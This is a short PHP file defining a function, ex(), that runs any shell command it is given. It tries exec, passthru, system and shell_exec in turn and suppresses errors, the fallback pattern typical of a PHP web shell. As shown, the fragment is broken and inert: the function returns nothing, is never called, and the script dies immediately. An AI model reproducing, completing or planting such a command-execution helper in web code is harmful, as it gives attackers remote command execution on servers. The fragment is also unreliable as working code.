<?php
function ex($in) {
	if(function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	}elseif(function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	}elseif(function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	}elseif(function_exists('shell_exec')) {
		$out = shell_exec($in);
	}
}
die();
?>